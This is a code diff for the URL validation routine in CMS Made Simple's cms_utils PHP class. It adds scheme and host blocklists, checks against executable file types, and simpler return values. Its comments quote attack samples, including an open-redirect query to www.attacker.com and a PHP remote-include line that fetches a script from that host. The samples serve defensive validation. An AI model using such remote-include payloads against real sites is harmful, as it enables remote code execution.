@@ -29,6 +29,10 @@
 #-------------------------------------------------------------------------
 #END_LICENSE
 
+use CMSMS\Database\Connection;
+use CMSMS\FileType;
+use CMSMS\FileTypeHelper;
+
 /**
  * A convenience class for CMS Made Simple.
  *
@@ -126,12 +130,12 @@ final class cms_utils
 	 *
 	 * @link http://phplens.com/lens/adodb/docs-adodb.htm
 	 * @since 1.9
-	 * @return \CMSMS\Database\Connection
-	 * @throws \Exception
+	 * @return Connection
+	 * @throws Exception
 	 */
 	final public static function get_db()
 	{
-		return \CmsApp::get_instance()->GetDb();
+		return CmsApp::get_instance()->GetDb();
 	}
 
 	/**
@@ -144,7 +148,7 @@ final class cms_utils
 	 */
 	final public static function get_config()
 	{
-		return \cms_config::get_instance();
+		return cms_config::get_instance();
 	}
 
 	/**
@@ -157,7 +161,7 @@ final class cms_utils
 	 */
 	final public static function get_smarty()
 	{
-		return \Smarty_CMS::get_instance();
+		return Smarty_CMS::get_instance();
 	}
 
 	/**
@@ -336,11 +340,11 @@ final class cms_utils
 	 *
 	 * @param string $url trim()'d, absolute or '[ROOT_URL]'-prefixed
 	 *  or (risky!) '//'-prefixed or site-root-relative or data
-	 * @param string $type Optional item-type known to FileTypeHelper
-	 *  e.g. 'image' Used only if $url refers to this site.
-	 * @return array 2 members:
-	 *  [0] = bool indicating acceptability
-	 *  [1] = error message or empty
+	 * @param string $type Optional item-type(s) known to FileTypeHelper
+	 *  e.g. 'image'. May be comma-separated series of such types.
+	 *  Any type(s) may be negated with a '!' prefix.
+	 *  Used only if $url refers to this site.
+	 * @return true or error message
 	 */
 	public static function validate_url($url,$type = '')
 	{
@@ -349,6 +353,10 @@ final class cms_utils
 				$local = true;
 			} elseif ($url[0] == '/' && $url[1] != '/') {
 				$url = CMS_ROOT_URL . $url;
+				$local = true;
+			} elseif (strpos($url,'/') === false) { // just a basename, presumably site-baseurl-relative
+				$url = CMS_ROOT_URL . '/'. $url; // this will suffice for validation
+								//unless $type checking is done and the file N/A
 				$local = true;
 			} elseif (startswith($url,'[ROOT_URL]')) {
 				$url = str_replace('[ROOT_URL]',CMS_ROOT_URL,$url);
@@ -363,6 +371,12 @@ final class cms_utils
 			// finds no 'scheme' property and explicit $scheme=null
 
 			$host = parse_url($url,PHP_URL_HOST);
+			if ($host) {
+				$blockhosts = []; // blacklisted hosts? e.g. a site-preference
+				if ($blockhosts && in_array(strtolower($host),array_map('strtolower',$blockhosts))) { // caseless check
+					return 'The URL host is prohibited';//TODO langify
+				}
+			}
 			if (startswith($url,'//')) {
 				$prel = true; // protocol-relative flag
 				$local = ($host == parse_url(CMS_ROOT_URL,PHP_URL_HOST));
@@ -372,45 +386,66 @@ final class cms_utils
 
 			$scheme = parse_url($url,PHP_URL_SCHEME);
 			if ($scheme) {
-				if (!in_array(strtolower($scheme),['https','http'])) { // maybe also 'data' for image only ? maybe ws[s] ? but prob'ly no websocket interaction for CMSMS
-					// typo checks
+				$val = strtolower($scheme);
+				if (!in_array($val,['https','http'])) {
+					if (!$local) {
+						// lots of valid schemes https://en.wikipedia.org/wiki/List_of_URI_schemes
+						// TODO also exclude ws[s]? prob'ly no websocket interaction for CMSMS
+						//  also exclude 'data' or allow that for image-url ?
+						if (in_array($val, [
+						'attachment',
+						'blob',
+						'chrome',
+						'cid',
+						'dns',
+						'example',
+						'file',
+						'filesystem',
+						'ftp',
+						'query',
+						'sftp',
+						'tel',
+						'tftp',
+						'view-source',
+						])) {
+							return 'The URL scheme is not appropriate';//TODO langify 'urlschemenotvalid'
+						}
+					}
+					// typo checks for these common ones
 					$pc = 0.0;
 					foreach (['https','http'] as $s) {
-						similar_text($scheme,$s,$pc);
+						similar_text($val,$s,$pc);
 						if ($pc > 60 && $pc < 100) {
 							$url = str_replace($scheme,$s,$url); // correct scheme
+							$scheme = $s;
 							break;
 						}
-						return [false,'The URL scheme is not appropriate'];//TODO langify 'urlschemenotvalid'
 					}
 				}
 			} elseif (!$prel) {
-				return [false,'The URL has no scheme'];//TODO langify 'urlschemenone'
+				return 'The URL has no scheme';//TODO langify 'urlschemenone'
 			}
-			if ($host) {
-				//validate or return false ....
-/*
-				// blacklisted hosts? e.g. a site-preference
-				if ($blockhosts && in_array(strtolower($parts['host']),array_map('strtolower',$blockhosts))) { // caseless check
-					return [false,'The URL host is prohibited'];//TODO langify
-				}
-				//TODO other sanity checks, malevolence checks
-				//e.g. refer to https://owasp.org/www-community/attacks/Forced_browsing
-				//www.example.com/function.jsp?fwd=admin.jsp
-				//www.example.com/example.php?url=http://malicious.example.com
-*/
-			} elseif ($scheme != 'data') { //for a data url, $host = null
-				return [false,'The URL has no host']; //TODO langify 'urlhostnotvalid'
+			if (!($scheme == 'data' || $host)) { //for a data url, $host = null
+				return 'The URL has no host'; //TODO langify 'urlhostnotvalid'
 			}
+			//TODO other sanity checks, malevolence checks
+			//e.g. refer to https://owasp.org/www-community/attacks/Forced_browsing
+			//www.example.com/function.jsp?fwd=admin.jsp
+			//www.example.com/example.php?url=http://malicious.example.com
+			//www.example.com/?go=http%3A%2F%2Fwww.attacker.com%2Fmalscript.txt%3Fq%3D
+			//<?php include("http://www.attacker.com/malscript.txt?q=.php");
 			// deal with
 			// malicious payload as part of the URL, executed immediately when the URL is accessed c.f. sanitize funcs e.g. news_ops::execSpecialize(), UserGuideUtils::cleanContent()
+			$url = html_entity_decode($url);
+			$url = urldecode($url);
 			// malicious payload in data, executed when the data is retrieved and rendered on the page
+			//c.f. self::cleanurlpath()
 			if ($scheme != 'data') {
 				$p = strpos($url,$host) + strlen($host);
 				$u2 = substr($url,$p);
 				// check for tag(s) TODO check for other bad payloads
 				if (preg_match('/<[^>]*>/',$u2)) {
-					return [false,lang('illegalcharacters',lang('url'))];
+					return lang('illegalcharacters',lang('url'));
 				}
 				// 2-stage escape (to prevent double-escaping '%')
 				$u3 = preg_replace_callback('~[^\w:/?#\]\'[@!$&()*+;=%]~',function($matches) {
@@ -420,16 +455,26 @@ final class cms_utils
 					return rawurlencode($matches[0]);
 				},$u3);
 				$url2 = substr($url,0,$p).$u4;
-				if (!filter_var($url2,FILTER_VALIDATE_URL)) { // no 'extended-chars' support cuz local url maps to filesystem
-					return [false,lang('illegalcharacters',lang('url'))];
-				} elseif ($local) {
-					$parts = parse_url($url2);
-					if (!$prel) {
-						if (!$parts || count($parts) > 3 || $parts != array_intersect_key($parts,['scheme'=>1,'host'=>1,'path'=>1])) { // we've already detected scheme and host, also want path but nothing else
-							return [false,'The URL is not acceptable in this context']; //TODO langify 'urlnotvalid'
+				$helper = new CMSMS\FileTypeHelper();
+				$t = '!'.CMSMS\FileType::TYPE_EXECUTABLE;
+				if ($type && strpos($type, $t) !== false) {
+					// prohibit executable ('.php' etc) BUT .php is probably valid
+					foreach ($helper->get_file_type_extensions(CMSMS\FileType::TYPE_EXECUTABLE) as $ext) {
+						if ($ext != 'php') {
+							$l = strlen($ext);
+							if (substr_compare($u4,$ext,-$l,$l,true) == 0) {
+								return lang('illegalcharacters',lang('url'));
+							}
 						}
-					} elseif (!$parts || count($parts) > 2 || $parts != array_intersect_key($parts,['host'=>1,'path'=>1])) { // we've already detected host, also want path but nothing else
-						return [false,'The URL is not acceptable in this context']; //TODO langify 'urlnotvalid'
+					}
+				}
+				if ($local) {
+					if (!filter_var($url2,FILTER_VALIDATE_URL)) { // no 'extended-chars' support cuz local url maps to filesystem
+						return lang('illegalcharacters',lang('url'));
+					}
+					$parts = parse_url($url2);
+					if (!$parts) {
+						return 'The URL is malformed'; //TODO lang('invalidurl') if frontend request?
 					}
 					if ($type) {
 						// validate file extension, using part of original url
@@ -438,16 +483,37 @@ final class cms_utils
 						$p = ($fn) ? strrpos($fn,'.') : -1;
 						$ext = ($p > 0) ? substr($fn,$p+1): '';
 						if (!$ext) {
-							return [false,lang('typenotvalid')];
+							return lang('typenotvalid');
 						} else {
-							$helper = new CMSMS\FileTypeHelper();
-							$imgexts = $helper->get_file_type_extensions($type);
-								if (!$imgexts || !in_array(strtolower($ext),$imgexts)) {
-								return [false,lang('typenotvalid')];
+							$ext = strtolower($ext);
+							$allchecks = array_map('trim',explode(',',$type));
+							foreach ($allchecks as $onetype) {
+								$neg = ($onetype[0] == '!');
+								if ($neg) { $onetype = substr($onetype,1); }
+								$helperexts = $helper->get_file_type_extensions($onetype);
+								if ($neg) {
+									if ($helperexts && in_array($ext,$helperexts)) {
+										return lang('typenotvalid');
+									}
+								}
+								elseif (!$helperexts || !in_array($ext,$helperexts)) {
+									return lang('typenotvalid');
+								}
 							}
 						}
 					}
 					// confirm access
+					// ignore any post-path url-parts
+					$l = 0;
+					foreach (array_intersect_key($parts,['scheme'=>1,'host'=>1,'path'=>1]) as $pp => $pv) {
+						if (isset($parts[$pp])) {
+							$p = strpos($url,$pv);
+							$l = max($l, $p + strlen($pv));
+						}
+					}
+					if ($l > 0) {
+						$url = substr($url, 0, $l);
+					}
 					if (!$prel) {
 						$fp = str_replace([CMS_ROOT_URL,'/'],[CMS_ROOT_PATH,DIRECTORY_SEPARATOR],$url);
 					} else {
@@ -455,15 +521,20 @@ final class cms_utils
 						$fp = str_replace(["//{$host}{$matches[1]}",'/'],[CMS_ROOT_PATH,DIRECTORY_SEPARATOR],$url);
 					}
 					if (!is_readable($fp)) {
-						return [false,lang('CMSEX_F001')];
+						return lang('CMSEX_F001');
 					}
 				} else {
+					// not a local url
+					// mimic FILTER_VALIDATE_URL, but allowing relevant valid UTF-8 and extended-ASCII chars TODO extended only if non-local
+					if (preg_match('/[^\x20-\x7e\pL\p{Nd}\p{Po}\x82-\x84\x88\x8a\x8c\x8e\x91-\x94\x96-\x98\x9a\x9c\x9e\x9f\xa8\xad\xb4\xb7\xb8\xc0-\xf6\xf8-\xff]/u',$url)) {
+						return lang('illegalcharacters',lang('url'));
+					}
 					// offsite-url check
 					$req = new cms_http_request(['timeout' => 3]);
 					$res1 = $req->execute($url2,CMS_ROOT_URL,'HEAD');// for a GET, add nocache header
 					$res2 = $req->getStatus();
 					if ($res1 != 'OK') {
-						return [false,'The URL is not accessible']; //TODO langify
+						return 'The URL is not accessible'; //TODO langify
 					}
 				}
 				//TODO data-payload content check ?
@@ -471,12 +542,12 @@ final class cms_utils
 				'/^data:([a-z]+\/[a-z0-9-+.]+(;[a-z0-9-.!#$%*+.{}|~`]+=[a-z0-9-.!#$%*+.{}()_|~`]+)*)?(;base64)?,([a-z0-9!$&\',()*+;=\-._~:@\/?%\s<>]*?)$/i',
 				$url)) {
 				// data url validation regex adapted from github.com/killmenot/valid-data-url/blob/master/index.js
-				return [false,lang('illegalcharacters',lang('url'))];
+				return lang('illegalcharacters',lang('url'));
 			}
-			return [true,''];
+			return true; // the url is valid
 		} // url
 
-		return [false,lang('informationmissing').': image url'];
+		return lang('informationmissing').': image url';
 	}
 
 	/**
@@ -502,6 +573,4 @@ final class cms_utils
 		}
 		return Search_content::Find($needle,$field,$strict);
 	}
-} // end of class
-
-?>
+} // class
